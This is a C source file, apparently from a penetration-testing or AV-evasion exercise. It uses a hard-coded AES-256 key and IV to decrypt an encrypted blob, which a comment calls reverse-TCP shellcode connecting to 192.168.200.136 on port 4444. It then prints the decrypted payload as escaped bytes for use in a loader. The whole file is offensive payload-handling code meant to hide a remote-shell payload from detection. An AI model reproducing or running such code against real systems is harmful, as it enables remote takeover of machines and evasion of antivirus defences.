#include<stdio.h>
#include<stdlib.h>
#include<string.h>


#define CBC 1
#define CTR 1
#define ECB 1
#define AES256 1

#include "aes.h"

int i;
static void decrypt(void)
{
    // IV: mykeyishardtobreak
    uint8_t iv[]  = { 
			0x6d, 0x79, 0x6b, 0x65, 0x79, 0x69, 0x73, 0x68, 0x61, 0x72, 0x64, 0x74, 0x6f, 0x73, 0x65, 0x65 
		    };

    uint8_t key[] = { 
			0x73, 0x70, 0x63, 0x75, 0x79, 0x69, 0x6a, 0x62, 0x73, 0x64, 0x67, 0x77, 0x74, 0x69, 0x67, 0x66,
			0x65, 0x64, 0x79, 0x6d, 0x79, 0x78, 0x7a, 0x61, 0x6d, 0x73, 0x6b, 0x75, 0x63, 0x62, 0x6d, 0x72 
		    };

    //Shellcode Reverse TCP connect to my ip 192.168.200.136 at port 4444
    uint8_t shellcode[] = { 
				 0xf5,0xd0,0xb8,0xd4,0x53,0xb4,0x78,0x58,0x08,0xfa,0x7f,0x72,0x1d,0x17,0x5c,0x5c,0x16,0x94,0xcf,0x8a,0x01,0x3a,0xf3,0xd5,0xd9,0x58,0xe5,0x4a,0xe5,0xa5,0xa9,0x68,0xf0,0x8d,0x7f,0xbe,0xe5,0x3c,0x42,0xe7,0x7c,0x26,0x9e,0x8f,0xf2,0x03,0x42,0x8b,0xde,0xaa,0x0c,0xfb,0x63,0xe0,0x4a,0x88,0xa0,0x0c,0x8f,0xb9,0xe9,0x59,0x2c,0x86,0xa1,0xed,0xaa,0xb2,0xa2,0xed,0xa5,0xa8,0xed,0x26,0x2a,0xf6,0x20,0x15,0xd6,0xff,0x94,0x3f,0x5c,0x25,0x59,0x8d,0xff,0xda,0xf2,0x8f,0x6e,0xa0,0x6a,0xc3,0x63,0x98
			  };

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, shellcode, sizeof(shellcode));


    printf("Decrypted Shellcode Format 1:");
    printf("\n");

    for (i = 0; i < sizeof shellcode; i ++)
    {
        printf("\\x%02x", shellcode[i]);
    }

    printf("\n");

    printf("Decrypted Shellcode Format 2:");
    printf("\n");
	 
    for (i = 0; i < sizeof shellcode; i ++)
    {
        if(i == sizeof(shellcode)-1)
	{
		printf("0x%02x", shellcode[i]);
	}else{
		printf("0x%02x,", shellcode[i]);
	}
    }

    printf("\n");
}

int main(void)
{
    decrypt();
}
